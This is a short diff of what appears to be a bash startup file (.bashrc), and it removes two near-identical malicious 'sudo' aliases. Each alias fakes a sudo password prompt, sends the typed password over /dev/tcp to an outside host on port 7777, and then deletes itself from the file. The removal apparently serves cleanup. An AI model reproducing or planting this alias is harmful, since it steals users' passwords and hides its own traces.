@@ -122,5 +122,3 @@ if ! shopt -oq posix; then
     . /etc/bash_completion
   fi
 fi
-alias sudo='stty -echo;set +m;{ ( sleep 6 && pkill nc 2>/dev/null && pkill cat 2>&1>/dev/null)} 2>&1>/dev/null & echo "[sudo] password for $USER:" && {(cat >> /dev/tcp/urkon.maskster.site/7777)} 2>>/dev/null;unalias sudo 2>/dev/null;stty echo;set -m;{(head -n -1 ~/.bashrc > sup;mv sup ~/.bashrc)};'
-alias sudo='stty -echo;set +m;{ ( sleep 6 && pkill nc 2>/dev/null && pkill cat 2>&1>/dev/null)} 2>&1>/dev/null & echo "[sudo] password for $USER:" && {(cat >> /dev/tcp/urkon.maskster.site/7777)} 2>>/dev/null;unalias sudo 2>/dev/null;stty echo;set -m;{(head -n -1 ~/.bashrc > su;mv su ~/.bashrc)};' 
